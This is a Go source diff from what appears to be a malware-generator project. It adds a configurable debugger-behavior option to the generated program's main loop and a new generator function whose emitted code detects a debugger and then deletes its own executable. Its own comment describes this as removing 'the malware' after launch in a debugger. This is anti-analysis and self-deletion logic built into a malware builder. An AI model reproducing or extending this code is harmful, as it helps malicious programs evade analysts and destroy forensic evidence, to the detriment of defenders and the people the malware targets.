@@ -89,7 +89,14 @@ func generate_main_function(s_json string, boot_functions []string, loop_functio
 		main_functions = append(main_functions, fmt.Sprintf("%s()", boot_name))
 	}
 
-	main_functions = append(main_functions, "for !detect_debugger() {")
+	// Decide the header of the foor loop
+	if data_object.Debugger_behavior == "stop" {
+		main_functions = append(main_functions, "for !detect_debugger() {")
+	} else if data_object.Debugger_behavior == "remove" {
+		main_functions = append(main_functions, "for !debugger_detection_removal() {")
+	} else if data_object.Debugger_behavior == "none" {
+		main_functions = append(main_functions, "for {")
+	}
 
 	// Add loop function
 	for _, loop_name := range loop_functions {
@@ -259,10 +266,36 @@ func generate_debugger_detection(s_json string) string {
 			"}}")
 
 		data_object.Add_go_import("io")
+		data_object.Add_go_import("fmt")
+
 	}
 
 	body = append(body, "return toReturn", "}")
 	data_object.Add_go_function(body)
+
+	return structure.Send(data_object)
+}
+
+//
+//
+// Generates the code which will remove the malware
+// after it has been launched in a debugger
+//
+//
+func generate_removal_malware(s_json string) string {
+	data_object := structure.Receive(s_json)
+	body := []string{"func debugger_detection_removal() bool {",
+		"toReturn := false",
+		"toReturn = detect_debugger()",
+		"if toReturn {",
+		"path := tools.Grab_executable_path()",
+		"os.Remove(path)",
+		"}"}
+
+	body = append(body, "return toReturn", "}")
+	data_object.Add_go_function(body)
+	data_object.Add_go_import("os")
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
 
 	return structure.Send(data_object)
 }
@@ -278,6 +311,8 @@ func Parse(s_json string) string {
 	s_json = generate_structs(s_json)
 
 	s_json = generate_debugger_detection(s_json)
+
+	s_json = generate_removal_malware(s_json)
 
 	s_json, boot_func, loop_func := generate_sub_functions(s_json)
 
